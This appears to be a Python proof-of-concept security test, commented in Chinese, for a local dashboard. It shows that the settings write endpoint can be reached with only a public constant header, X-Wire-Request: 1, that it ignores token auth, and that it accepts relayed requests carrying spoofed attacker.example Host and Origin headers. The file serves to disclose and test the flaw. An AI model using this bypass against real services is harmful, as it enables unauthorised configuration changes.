"""安全 PoC 1：写接口只靠「回环 + 固定请求头」防护。

复现路径：
1. 没有 X-Wire-Request 时写接口 403（对照）。
2. 加上公开常量 X-Wire-Request: 1 后即可写，不需要任何凭据。
3. 即使设置了 QF_WIRE_API_TOKEN 且强制读接口鉴权，写接口仍然不需要 token。
4. 通过本机 127.0.0.1 上的端口转发（模拟 nginx / SSH 隧道）访问时，
   服务端只看到 127.0.0.1，Host / X-Forwarded-For / Origin 均不参与判定。

运行：python tests/security/poc_write_surface.py
"""
from __future__ import annotations

import tempfile
from pathlib import Path

from _harness import Dashboard, LoopbackRelay, body_json, check, clean_env, finish, request

SIGNED = {"X-Wire-Request": "1"}


def main() -> None:
    with tempfile.TemporaryDirectory(prefix="qf-poc-write-") as raw_tmp:
        tmp = Path(raw_tmp)
        with clean_env(tmp / ".env.local"), Dashboard(tmp) as dash:
            status, _, payload = request(
                dash.base, "/api/settings", method="POST", payload={"provider": "claude-cli"}
            )
            check(status == 403, "对照：缺少 X-Wire-Request 时写接口返回 403")
            check("本机" in body_json(payload).get("error", ""), "对照：403 原因是缺少本机请求标记")

            status, _, payload = request(
                dash.base,
                "/api/settings",
                method="POST",
                payload={"provider": "claude-cli"},
                headers=SIGNED,
            )
            check(status == 200, "仅凭公开常量头 X-Wire-Request: 1 即可写入设置（无需凭据）")
            check(body_json(payload).get("provider") == "claude-cli", "写入已生效并返回设置")

            import os

            os.environ["QF_WIRE_API_TOKEN"] = "poc-read-token-not-a-real-secret"
            os.environ["QF_WIRE_API_REQUIRE_TOKEN"] = "1"

            status, _, _ = request(dash.base, "/api/settings")
            check(status == 401, "对照：开启强制鉴权后，读接口无 token 返回 401")

            status, _, _ = request(
                dash.base,
                "/api/settings",
                method="POST",
                payload={"provider": "claude-cli"},
                headers=SIGNED,
            )
            check(status == 200, "读接口已被 token 保护，但写接口仍不需要 token")

            relay = LoopbackRelay(dash.port)
            try:
                status, _, _ = request(
                    f"http://127.0.0.1:{relay.port}",
                    "/api/settings",
                    method="POST",
                    payload={"provider": "claude-cli"},
                    headers={
                        **SIGNED,
                        "Host": "attacker.example",
                        "X-Forwarded-For": "203.0.113.9",
                        "Origin": "https://attacker.example",
                    },
                )
                check(
                    status == 200,
                    "经本地反向代理（对端 127.0.0.1）写请求被放行；"
                    "伪造 Host / X-Forwarded-For / Origin 不影响判定",
                )
            finally:
                relay.close()

    finish("poc_write_surface")


if __name__ == "__main__":
    main()
